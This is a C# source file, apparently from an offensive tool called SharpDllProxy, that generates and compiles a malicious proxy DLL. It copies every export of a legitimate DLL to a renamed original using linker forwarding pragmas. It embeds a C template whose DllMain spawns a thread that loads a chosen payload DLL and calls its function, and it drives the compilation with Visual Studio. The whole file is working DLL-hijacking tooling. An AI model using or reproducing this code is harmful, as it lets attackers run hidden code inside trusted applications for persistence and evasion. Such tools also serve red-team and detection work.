using Microsoft.VisualStudio.Setup.Configuration;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace SharpDllProxy
{
    public class ProxyCreator
    {

        public static string dllTemplate = @"
#include ""pch.h""
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    HMODULE hLib = LoadLibraryA(""PAYLOAD_DLL_PATH"");
    if (hLib == NULL) {
        return 1;
    }

    FARPROC pFunc = GetProcAddress(hLib, ""PAYLOAD_FUNC_NAME"");
    if (pFunc == NULL) {
        FreeLibrary(hLib);
        return 1;
    }

    pFunc();

    FreeLibrary(hLib);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
            CloseHandle(threadHandle);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
";


        private Action<string> _logger;

        public ProxyCreator(Action<string> logger = null)
        {
            _logger = logger ?? (Action<string>)((string s)=>{});
        }

        public void CreateProxy(string orgDllPath, string payloadDllPath, string payloadFuncName)
        {
            var pragmaBuilder = "";
            if (string.IsNullOrWhiteSpace(orgDllPath) || !File.Exists(orgDllPath))
            {
                _logger($"[!] Cannot locate DLL path, does it exist?");
                Environment.Exit(0);
            }

            // Derieve proxied DLL name from original name's MD5 hash
            //var tempName = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
            string tempName;
            string orgDllName = Path.GetFileNameWithoutExtension(orgDllPath);
            byte[] md5 = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(orgDllName));
            byte[] md5prefix = md5.Take(8).ToArray();
            tempName = "proxied_" + BitConverter.ToString(md5prefix).Replace("-", "").ToLower();

            if (string.IsNullOrWhiteSpace(payloadDllPath) || !File.Exists(payloadDllPath))
            {
                _logger($"[!] Cannot locate payload DLL path, does it exist?");
                Environment.Exit(0);
            }

            if (string.IsNullOrWhiteSpace(payloadFuncName))
            {
                _logger($"[!] Payload function name is empty, bad input!");
                Environment.Exit(0);
            }

            // Check for boilerplate C++ header files presense: pch.h and framework.h
            var currentDirectory = Directory.GetCurrentDirectory();
            var pchPath = Path.Combine(currentDirectory, "pch.h");
            var frameworkPath = Path.Combine(currentDirectory, "framework.h");
            if (!File.Exists(pchPath))
            {
                _logger($"[!] pch.h not found in the current directory.");
                return;
            }
            if (!File.Exists(frameworkPath))
            {
                _logger($"[!] framework.h not found in the current directory.");
                return;
            }

            //Create an output directory to export stuff too
            string outPath = Directory.CreateDirectory("output_" + Path.GetFileNameWithoutExtension(orgDllPath)).FullName;

            _logger($"[+] Reading exports from {orgDllPath}...");

            //Read PeHeaders -> Exported Functions from provided DLL
            PeNet.PeFile dllPeHeaders = new PeNet.PeFile(orgDllPath);

            //Build up our linker redirects
            foreach (var exportedFunc in dllPeHeaders.ExportedFunctions)
            {
                pragmaBuilder += $"#pragma comment(linker, \"/export:{exportedFunc.Name}={tempName}.{exportedFunc.Name},@{exportedFunc.Ordinal}\")\n";
            }
            _logger($"[+] Redirected {dllPeHeaders.ExportedFunctions.Count()} function calls from {Path.GetFileName(orgDllPath)} to {tempName}.dll");

            //Replace data in our template
            dllTemplate = dllTemplate.Replace("PRAGMA_COMMENTS", pragmaBuilder);
            payloadDllPath = payloadDllPath.Replace(@"\", @"\\");
            dllTemplate = dllTemplate.Replace("PAYLOAD_DLL_PATH", payloadDllPath);
            dllTemplate = dllTemplate.Replace("PAYLOAD_FUNC_NAME", payloadFuncName);

            _logger($"[+] Exporting DLL C source to {outPath + @"\" + Path.GetFileNameWithoutExtension(orgDllPath)}_pragma.c");


            // Write the proxied DLL to the output directory
            string proxiedDllPath = outPath + @"\" + tempName + ".dll";
            File.WriteAllBytes(proxiedDllPath, File.ReadAllBytes(orgDllPath));

            // Write helper header files to compilation dir
            File.Copy(pchPath, Path.Combine(outPath, "pch.h"), overwrite: true);
            File.Copy(frameworkPath, Path.Combine(outPath, "framework.h"), overwrite: true);

            // Write proxying DLL's source code to the compilation dir
            string sourceCodeFile = outPath + @"\" + Path.GetFileNameWithoutExtension(orgDllPath) + "_pragma.c";
            File.WriteAllText(sourceCodeFile, dllTemplate);

            string outputDll = outPath + @"\" + Path.GetFileName(orgDllPath);

            // Compile
            Compile(sourceCodeFile, outputDll);
        }

        private void Compile(string sourceFile, string outputDllFile)
        {
            string visualStudioPath = GetVisualStudioPath();
            if (string.IsNullOrEmpty(visualStudioPath))
            {
                _logger("[x] Visual Studio installation not found. Can not compile dll.");
                return;
            }

            string vcvarsallPath = Path.Combine(visualStudioPath, @"VC\Auxiliary\Build\vcvarsall.bat");
            string arch = "x64"; // Change this based on your target architecture

            string tempFolder = Path.Combine(Path.GetTempPath(), "compile_temp");
            Directory.CreateDirectory(tempFolder);

            string pdbPath = Path.Combine(tempFolder, Path.GetFileNameWithoutExtension(outputDllFile) + ".pdb");

            string cmdCommand = $"\"{vcvarsallPath}\" {arch} && cl /LD /D_USRDLL /D_WINDLL /Zi /Od " +
                $"/Fe\"{outputDllFile}\" " + // output .dll path
                $"/Fd\"{pdbPath}\" " + // output .dll path
                $"\"{sourceFile}\""; // input .c file

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{cmdCommand}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process { StartInfo = psi })
            {
                process.OutputDataReceived += (sender, args) => _logger(args.Data);
                process.ErrorDataReceived += (sender, args) => _logger(args.Data);

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();
            }

            if (File.Exists(outputDllFile))
            {
                _logger("[+] Compilation successful: " + outputDllFile);
            }
            else
            {
                _logger("[x] Compilation failed.");
            }
        }

        static string GetVisualStudioPath()
        {
            try
            {
                var query = new SetupConfiguration();
                var instanceEnumerator = query.EnumInstances();
                int fetched;
                var instances = new ISetupInstance[1];

                while (true)
                {
                    instanceEnumerator.Next(1, instances, out fetched);
                    if (fetched == 0)
                        break;

                    var instance = instances[0];
                    //_logger($"Instance ID: {instance.GetInstanceId()}");
                    return instance.GetInstallationPath();
                }
                return null;
            }
            catch (Exception)
            {
                throw null;
            }
        }
    }
}
